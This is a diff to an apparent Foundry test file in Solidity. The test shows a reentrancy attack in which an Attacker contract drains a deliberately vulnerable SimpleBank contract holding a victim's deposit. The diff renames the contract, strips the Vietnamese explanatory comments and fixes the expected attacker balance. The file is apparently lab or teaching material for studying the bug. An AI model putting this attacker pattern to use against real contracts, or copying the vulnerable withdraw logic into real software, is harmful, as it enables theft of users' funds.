@@ -3,15 +3,13 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 
-// Target hợp đồng SimpleBank với lỗi Reentrancy
-contract SimpleBankTarget {
+contract SimpleBankVulnerable {
     mapping(address => uint256) public balances;
 
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
 
-    // Lỗi Reentrancy: Chuyển tiền trước khi hạ balance xuống 0 (Vi phạm CEI)
     function withdraw() public {
         uint256 balance = balances[msg.sender];
         require(balance > 0, "So du khong du");
@@ -24,10 +22,10 @@ contract SimpleBankTarget {
 }
 
 contract Attacker {
-    SimpleBankTarget public bank;
+    SimpleBankVulnerable public bank;
 
     constructor(address payable _bank) {
-        bank = SimpleBankTarget(_bank);
+        bank = SimpleBankVulnerable(_bank);
     }
 
     receive() external payable {
@@ -37,46 +35,41 @@ contract Attacker {
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether, "Need 1 ether");
+        require(msg.value >= 1 ether, "Need at least 1 ether");
         bank.deposit{value: 1 ether}();
         bank.withdraw();
     }
 }
 
 contract ReentrancyTest is Test {
-    SimpleBankTarget public bank;
+    SimpleBankVulnerable public bank;
     Attacker public attacker;
-
-    address public victim = address(0x1);
+    address public victim;
 
     function setUp() public {
-        bank = new SimpleBankTarget();
-        
-        // Victim gửi 10 ether vào ngân hàng
+        bank = new SimpleBankVulnerable();
+        victim = makeAddr("victim");
         vm.deal(victim, 10 ether);
         vm.prank(victim);
         bank.deposit{value: 10 ether}();
 
-        // Kẻ tấn công khởi tạo với 1 ether
         attacker = new Attacker(payable(address(bank)));
         vm.deal(address(attacker), 1 ether);
     }
 
     function testReentrancyExploit() public {
-        uint256 bankInitialBalance = address(bank).balance;
-        assertEq(bankInitialBalance, 10 ether);
+        uint256 bankBalanceBefore = address(bank).balance;
+        assertEq(bankBalanceBefore, 10 ether);
 
-        // Kẻ tấn công thực thi Reentrancy Attack
         attacker.attack{value: 1 ether}();
 
-        uint256 bankFinalBalance = address(bank).balance;
-        console.log("Bank balance before attack:", bankInitialBalance);
-        console.log("Bank balance after attack:", bankFinalBalance);
-        console.log("Attacker contract balance after attack:", address(attacker).balance);
+        uint256 bankBalanceAfter = address(bank).balance;
+        uint256 attackerBalanceAfter = address(attacker).balance;
 
-        // Xác minh ngân hàng bị rút cạn toàn bộ tiền về 0
-        assertEq(bankFinalBalance, 0);
-        // Attacker chiếm trọn 11 ether từ ngân hàng (10 ETH của nạn nhân + 1 ETH của kẻ tấn công)
-        assertEq(address(attacker).balance, 12 ether);
+        emit log_named_uint("Bank balance after attack", bankBalanceAfter);
+        emit log_named_uint("Attacker balance after attack", attackerBalanceAfter);
+
+        assertEq(bankBalanceAfter, 0);
+        assertEq(attackerBalanceAfter, 11 ether);
     }
 }
